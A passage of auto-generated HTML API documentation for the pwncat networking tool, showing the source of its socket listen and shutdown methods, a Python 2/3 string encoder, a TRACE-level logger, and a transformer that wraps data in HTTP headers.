        msg = <span class="hljs-string">"Resolving {} host: {} failed: {}"</span>.format(
            self.get_family_name(family), str(host), str(error)
        )
        self.__log.debug(msg)
        <span class="hljs-keyword">raise</span> socket.gaierror(msg)  <span class="hljs-comment"># type: ignore</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.listen"><code class="name flex">
                            <span>def <span class="ident">listen</span></span>(<span>self, sock, backlog)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Listen for connections made to the socket.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>sock</code></strong>
                                        :<code>socket.socket</code></dt>
                                    <dd>The socket to listen on.</dd>
                                    <dt><strong><code>backlog</code></strong> :<code>int</code>
                                    </dt>
                                    <dd>Listen backlog</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>If listening fails.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">listen</span>(<span
                                        class="hljs-params">self, sock, backlog</span>):</span>
    <span class="hljs-comment"># type: (socket.socket, int) -&gt; None</span>
    <span class="hljs-string">"""Listen for connections made to the socket.

    Args:
        sock (socket.socket): The socket to listen on.
        backlog (int): Listen backlog

    Raises:
        socket.error: If listening fails.
    """</span>
    <span class="hljs-keyword">try</span>:
        self.__log.debug(<span class="hljs-string">"Listening with backlog=%d"</span>, backlog)
        sock.listen(backlog)
    <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Listening failed: {}"</span>.format(error)
        self.__log.error(msg)
        <span class="hljs-keyword">raise</span> socket.error(msg)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.shutdown_recv"><code class="name flex">
                            <span>def <span class="ident">shutdown_recv</span></span>(<span>self, sock, name)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Shuts down a socket for receiving data (only allow
                                to send data).</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>Name of the socket used for logging purposes.</dd>
                                    <dt><strong><code>sock</code></strong> :<code>str</code></dt>
                                    <dd>Socket to shutdown for receive.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">shutdown_recv</span>(<span
                                        class="hljs-params">self, sock, name</span>):</span>
    <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
    <span class="hljs-string">"""Shuts down a socket for receiving data (only allow to send data).

    Args:
        name (str): Name of the socket used for logging purposes.
        sock (str): Socket to shutdown for receive.
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
        <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
        <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
        self.__log.trace(<span class="hljs-string">"Shutting down %s socket for receiving"</span>, name)  <span
                                            class="hljs-comment"># type: ignore</span>
        sock.shutdown(socket.SHUT_RD)
    <span class="hljs-keyword">except</span> (OSError, socket.error):
        <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
        <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
        <span class="hljs-keyword">pass</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.shutdown_send"><code class="name flex">
                            <span>def <span class="ident">shutdown_send</span></span>(<span>self, sock, name)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Shuts down a socket for sending data (only allow to
                                receive data).</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>Name of the socket used for logging purposes.</dd>
                                    <dt><strong><code>sock</code></strong> :<code>str</code></dt>
                                    <dd>Socket to shutdown for send.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">shutdown_send</span>(<span
                                        class="hljs-params">self, sock, name</span>):</span>
    <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
    <span class="hljs-string">"""Shuts down a socket for sending data (only allow to receive data).

    Args:
        name (str): Name of the socket used for logging purposes.
        sock (str): Socket to shutdown for send.
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
        <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
        <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
        self.__log.trace(<span class="hljs-string">"Shutting down %s socket for sending"</span>, name)  <span
                                            class="hljs-comment"># type: ignore</span>
        sock.shutdown(socket.SHUT_WR)
    <span class="hljs-keyword">except</span> (OSError, socket.error):
        <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
        <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
        <span class="hljs-keyword">pass</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.StringEncoder"><code class="flex name class">
                    <span>class <span class="ident">StringEncoder</span></span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Takes care about Python 2/3 string encoding/decoding.</p>
                        <p>This allows to parse all string/byte values internally between all
                            classes or functions as strings to keep full Python 2/3 compat.</p>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">StringEncoder</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Takes care about Python 2/3 string encoding/decoding.

    This allows to parse all string/byte values internally between all
    classes or functions as strings to keep full Python 2/3 compat.
    """</span>

    CODECS = [
        <span class="hljs-string">"utf-8"</span>,
        <span class="hljs-string">"cp437"</span>,
        <span class="hljs-string">"latin-1"</span>,
    ]

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Class methods</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rstrip</span>(<span
            class="hljs-params">cls, data, search=None</span>):</span>
        <span class="hljs-comment"># type: (Union[bytes, str], Optional[str]) -&gt; Union[bytes, str]</span>
        <span class="hljs-string">"""Implementation of rstring which works on bytes or strings."""</span>
        <span class="hljs-comment"># We have a bytes object in Python3</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                                    class="hljs-number">3</span>, <span class="hljs-number">0</span>) <span
                                    class="hljs-keyword">and</span> type(data) <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> str:
            <span class="hljs-comment"># Strip whitespace</span>
            <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                    new = data
                    new = cls.rstrip(new, <span class="hljs-string">" "</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\n"</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\r"</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\t"</span>)
                    <span class="hljs-comment"># Loop until no more changes occur</span>
                    <span class="hljs-keyword">if</span> new == data:
                        <span class="hljs-keyword">return</span> new
            <span class="hljs-keyword">else</span>:
                bsearch = StringEncoder.encode(search)
                <span class="hljs-keyword">while</span> data[<span class="hljs-number">-1</span>:] == bsearch:
                    data = data[:<span class="hljs-number">-1</span>]
                <span class="hljs-keyword">return</span> data

        <span class="hljs-comment"># Use native function</span>
        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> data.rstrip()
        <span class="hljs-keyword">return</span> data.rstrip(search)  <span class="hljs-comment"># type: ignore</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span
            class="hljs-params">cls, data</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bytes</span>
        <span class="hljs-string">"""Convert string into a byte type for Python3."""</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                                    class="hljs-number">3</span>, <span class="hljs-number">0</span>):
            <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
                <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
                <span class="hljs-keyword">if</span> codec == cls.CODECS[<span class="hljs-number">-1</span>]:
                    <span class="hljs-keyword">return</span> data.encode(codec)
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">return</span> data.encode(codec)
                <span class="hljs-keyword">except</span> UnicodeEncodeError:
                    <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> data  <span
                                    class="hljs-comment"># type: ignore</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span
            class="hljs-params">cls, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; str</span>
        <span class="hljs-string">"""Convert bytes into a string type for Python3."""</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                                    class="hljs-number">3</span>, <span class="hljs-number">0</span>):
            <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
                <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
                <span class="hljs-keyword">if</span> codec == cls.CODECS[<span class="hljs-number">-1</span>]:
                    <span class="hljs-keyword">return</span> data.decode(codec)
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">return</span> data.decode(codec)
                <span class="hljs-keyword">except</span> UnicodeDecodeError:
                    <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> data  <span
                                    class="hljs-comment"># type: ignore</span></code></pre>
                    </details>
                    <h3>Class variables</h3>
                    <dl>
                        <dt id="pwncat.StringEncoder.CODECS"><code class="name">var <span
                                class="ident">CODECS</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                    </dl>
                    <h3>Static methods</h3>
                    <dl>
                        <dt id="pwncat.StringEncoder.decode"><code class="name flex">
                            <span>def <span class="ident">decode</span></span>(<span>data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Convert bytes into a string type for Python3.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@classmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">decode</span>(<span class="hljs-params">cls, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; str</span>
    <span class="hljs-string">"""Convert bytes into a string type for Python3."""</span>
    <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                                            class="hljs-number">0</span>):
        <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
            <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
            <span class="hljs-keyword">if</span> codec == cls.CODECS[<span
                                            class="hljs-number">-1</span>]:
                <span class="hljs-keyword">return</span> data.decode(codec)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">return</span> data.decode(codec)
            <span class="hljs-keyword">except</span> UnicodeDecodeError:
                <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> data  <span class="hljs-comment"># type: ignore</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.StringEncoder.encode"><code class="name flex">
                            <span>def <span class="ident">encode</span></span>(<span>data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Convert string into a byte type for Python3.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@classmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">encode</span>(<span class="hljs-params">cls, data</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; bytes</span>
    <span class="hljs-string">"""Convert string into a byte type for Python3."""</span>
    <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                                            class="hljs-number">0</span>):
        <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
            <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
            <span class="hljs-keyword">if</span> codec == cls.CODECS[<span
                                            class="hljs-number">-1</span>]:
                <span class="hljs-keyword">return</span> data.encode(codec)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">return</span> data.encode(codec)
            <span class="hljs-keyword">except</span> UnicodeEncodeError:
                <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> data  <span class="hljs-comment"># type: ignore</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.StringEncoder.rstrip"><code class="name flex">
                            <span>def <span class="ident">rstrip</span></span>(<span>data, search=None)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Implementation of rstring which works on bytes or
                                strings.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@classmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">rstrip</span>(<span
        class="hljs-params">cls, data, search=None</span>):</span>
    <span class="hljs-comment"># type: (Union[bytes, str], Optional[str]) -&gt; Union[bytes, str]</span>
    <span class="hljs-string">"""Implementation of rstring which works on bytes or strings."""</span>
    <span class="hljs-comment"># We have a bytes object in Python3</span>
    <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                                            class="hljs-number">0</span>) <span
                                            class="hljs-keyword">and</span> type(data) <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> str:
        <span class="hljs-comment"># Strip whitespace</span>
        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                new = data
                new = cls.rstrip(new, <span class="hljs-string">" "</span>)
                new = cls.rstrip(new, <span class="hljs-string">"\n"</span>)
                new = cls.rstrip(new, <span class="hljs-string">"\r"</span>)
                new = cls.rstrip(new, <span class="hljs-string">"\t"</span>)
                <span class="hljs-comment"># Loop until no more changes occur</span>
                <span class="hljs-keyword">if</span> new == data:
                    <span class="hljs-keyword">return</span> new
        <span class="hljs-keyword">else</span>:
            bsearch = StringEncoder.encode(search)
            <span class="hljs-keyword">while</span> data[<span class="hljs-number">-1</span>:] == bsearch:
                data = data[:<span class="hljs-number">-1</span>]
            <span class="hljs-keyword">return</span> data

    <span class="hljs-comment"># Use native function</span>
    <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> data.rstrip()
    <span class="hljs-keyword">return</span> data.rstrip(search)  <span class="hljs-comment"># type: ignore</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.TraceLogger"><code class="flex name class">
                    <span>class <span class="ident">TraceLogger</span></span>
                    <span>(</span><span>name, level=0)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Extend Python's default logger class with TRACE level
                        logging.</p>
                        <p>Instantiate TraceLogger class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>name</code></strong> :<code>str</code></dt>
                            <dd>Instance name.</dd>
                            <dt><strong><code>level</code></strong> :<code>int</code></dt>
                            <dd>Current log level.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">TraceLogger</span>(<span
                                class="hljs-params">logging.getLoggerClass(<span
                                class="hljs-params"></span>)</span>):</span>  <span
                                class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Extend Python's default logger class with TRACE level logging."""</span>

    LEVEL_NUM = <span class="hljs-number">9</span>
    LEVEL_NAME = <span class="hljs-string">"TRACE"</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, name, level=logging.NOTSET</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; None</span>
        <span class="hljs-string">"""Instantiate TraceLogger class.

        Args:
            name (str):  Instance name.
            level (int): Current log level.
        """</span>
        super(TraceLogger, self).__init__(name, level)
        logging.addLevelName(self.LEVEL_NUM, self.LEVEL_NAME)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">trace</span>(<span
            class="hljs-params">self, msg, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (str, Any, Any) -&gt; None</span>
        <span class="hljs-string">"""Set custom log level for TRACE.

        Args:
            msg (str): The log message.
            args (args): *args for trace level log function.
            kwargs (kwargs): kwargs for trace level log function.
        """</span>
        <span class="hljs-keyword">if</span> self.isEnabledFor(self.LEVEL_NUM):
            <span class="hljs-comment"># Yes, logger takes its '*args' as 'args'.</span>
            self._log(self.LEVEL_NUM, msg, args, **kwargs)</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>logging.Logger</li>
                        <li>logging.Filterer</li>
                    </ul>
                    <h3>Class variables</h3>
                    <dl>
                        <dt id="pwncat.TraceLogger.LEVEL_NAME"><code class="name">var <span
                                class="ident">LEVEL_NAME</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                        <dt id="pwncat.TraceLogger.LEVEL_NUM"><code class="name">var <span
                                class="ident">LEVEL_NUM</span></code></dt>
                        <dd>
                            <div class="desc"></div>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.TraceLogger.trace"><code class="name flex">
                            <span>def <span class="ident">trace</span></span>(<span>self, msg, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Set custom log level for TRACE.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>msg</code></strong> :<code>str</code></dt>
                                    <dd>The log message.</dd>
                                    <dt><strong><code>args</code></strong> :<code>args</code></dt>
                                    <dd>*args for trace level log function.</dd>
                                    <dt><strong><code>kwargs</code></strong> :<code>kwargs</code>
                                    </dt>
                                    <dd>kwargs for trace level log function.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">trace</span>(<span
                                        class="hljs-params">self, msg, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (str, Any, Any) -&gt; None</span>
    <span class="hljs-string">"""Set custom log level for TRACE.

    Args:
        msg (str): The log message.
        args (args): *args for trace level log function.
        kwargs (kwargs): kwargs for trace level log function.
    """</span>
    <span class="hljs-keyword">if</span> self.isEnabledFor(self.LEVEL_NUM):
        <span class="hljs-comment"># Yes, logger takes its '*args' as 'args'.</span>
        self._log(self.LEVEL_NUM, msg, args, **kwargs)</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.Transform"><code class="flex name class">
                    <span>class <span class="ident">Transform</span></span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Abstract class to for pwncat I/O transformers.</p>
                        <p>This is a skeleton that defines how the transformer for pwncat should
                            look like.</p>
                        <p>Set specific options for this transformer.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">Transform</span>(<span
                                class="hljs-params">ABC</span>):</span>  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Abstract class to for pwncat I/O transformers.

    This is a skeleton that defines how the transformer for pwncat should look like.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer."""</span>
        super(Transform, self).__init__()
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Implement a transformer function which transforms a string..

        Args:
            data (bytes): data to be transformed.

        Returns:
            bytes: The transformed string.
        """</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Subclasses</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpPack"
                               title="pwncat.TransformHttpPack">TransformHttpPack</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpUnpack"
                               title="pwncat.TransformHttpUnpack">TransformHttpUnpack</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.TransformLinefeed"
                               title="pwncat.TransformLinefeed">TransformLinefeed</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.TransformSafeword"
                               title="pwncat.TransformSafeword">TransformSafeword</a>
                        </li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.Transform.log"><code class="name">var <span
                                class="ident">log</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger"
                                    title="pwncat.TraceLogger">TraceLogger</a></code>:
                                Logger instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
    <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
    <span class="hljs-keyword">return</span> self.__log</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.Transform.transform"><code class="name flex">
                            <span>def <span
                                    class="ident">transform</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Implement a transformer function which transforms a
                                string..</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>data</code></strong> :<code>bytes</code></dt>
                                    <dd>data to be transformed.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bytes</code></dt>
                                    <dd>The transformed string.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-meta">@abstractmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">transform</span>(<span class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
    <span class="hljs-string">"""Implement a transformer function which transforms a string..

    Args:
        data (bytes): data to be transformed.

    Returns:
        bytes: The transformed string.
    """</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.TransformHttpPack"><code class="flex name class">
                    <span>class <span class="ident">TransformHttpPack</span></span>
                    <span>(</span><span>opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement a transformation to pack data into HTTP
                        packets.</p>
                        <p>Set specific options for this transformer.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed"
                                    title="pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code>
                            </dt>
                            <dd>Transformer options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">TransformHttpPack</span>(<span
                                class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a transformation to pack data into HTTP packets."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, str]) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformHttpPack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

        <span class="hljs-keyword">assert</span> <span class="hljs-string">"reply"</span> <span
                                    class="hljs-keyword">in</span> opts
        <span class="hljs-keyword">assert</span> opts[<span
                                    class="hljs-string">"reply"</span>] <span class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"request"</span>, <span class="hljs-string">"response"</span>]

        <span class="hljs-comment"># Initial default header</span>
        self.__headers = [
            <span class="hljs-string">"Accept-Charset: utf-8"</span>,
        ]

        self.__response_headers_sent = <span class="hljs-literal">False</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Wrap data into a HTTP packet.

        Returns:
            bytes: The wrapped string.
        """</span>
        request_header = [
            <span class="hljs-string">"POST / HTTP/1.1"</span>,
            <span class="hljs-string">"Host: {}"</span>.format(self.__opts[<span
                                    class="hljs-string">"host"</span>]),
            <span class="hljs-string">"User-Agent: pwncat"</span>,
            <span class="hljs-string">"Accept: */*"</span>,
            <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
            <span class="hljs-string">"Content-Type: text/plain; charset=UTF-8"</span>,
        ]
        response_header = [
            <span class="hljs-string">"HTTP/1.1 200 OK"</span>,
            <span class="hljs-string">"Date: {}"</span>.format(self.__get_date()),
            <span class="hljs-string">"Server: pwncat"</span>,
            <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
            <span class="hljs-string">"Connection: close"</span>,
        ]

        self.__response_headers_sent = <span class="hljs-literal">True</span>

        <span class="hljs-keyword">if</span> self.__opts[<span class="hljs-string">"reply"</span>] == <span
                                    class="hljs-string">"request"</span>:
            header = StringEncoder.encode(
                <span class="hljs-string">"\n"</span>.join(request_header) + <span
                                    class="hljs-string">"\n"</span> + <span
                                    class="hljs-string">"\n"</span>.join(self.__headers) + <span
                                    class="hljs-string">"\n\n"</span>
            )
        <span class="hljs-keyword">else</span>:
            header = StringEncoder.encode(
                <span class="hljs-string">"\n"</span>.join(response_header) + <span
                                    class="hljs-string">"\n"</span> + <span
                                    class="hljs-string">"\n"</span>.join(self.__headers) + <span
                                    class="hljs-string">"\n\n"</span>
            )
        <span class="hljs-keyword">return</span> header + data

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_date</span>(<span
            class="hljs-params">self</span>):</span>  <span class="hljs-comment"># pylint: disable=no-self-use</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        now = datetime.utcnow()
        weekday = [<span class="hljs-string">"Mon"</span>, <span
                                    class="hljs-string">"Tue"</span>, <span class="hljs-string">"Wed"</span>, <span
                                    class="hljs-string">"Thu"</span>, <span class="hljs-string">"Fri"</span>, <span
